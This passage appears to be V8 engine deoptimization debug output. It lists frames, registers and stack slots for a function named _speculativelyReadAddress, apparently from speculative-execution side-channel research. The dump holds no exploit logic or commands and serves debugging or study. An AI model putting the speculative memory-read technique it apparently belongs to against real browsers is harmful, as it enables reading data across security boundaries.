                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     7               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     8               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
     9               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=r9}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    10              689   206  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=118, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x16ddeb705449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               INT32_STACK_SLOT {input=25}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x16ddeb705449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               LITERAL {literal_id=5 (0x16ddeb702691 <the_hole>)}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               LITERAL {literal_id=6 (0x16ddeb7025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=16}
    11              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    12              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    13              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    14              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    15              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    16              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    17              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=20}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    18              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_REGISTER {input=r14}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    19              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_REGISTER {input=r14}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    20              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_REGISTER {input=r14}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    21              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_REGISTER {input=r14}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    22              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_REGISTER {input=r14}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    23              215    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=215, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               STACK_SLOT {input=11}
                               REGISTER {input=rdi}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
    24               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    25               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    26               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    27               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    28               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    29               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    30               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    31               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    32               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r11}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    33              689   540  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=118, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x16ddeb705449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               INT32_STACK_SLOT {input=19}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x16ddeb705449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               LITERAL {literal_id=5 (0x16ddeb702691 <the_hole>)}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               LITERAL {literal_id=6 (0x16ddeb7025b1 <undefined>)}
                               LITERAL {literal_id=7 (1)}
                               STACK_SLOT {input=16}
    34              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
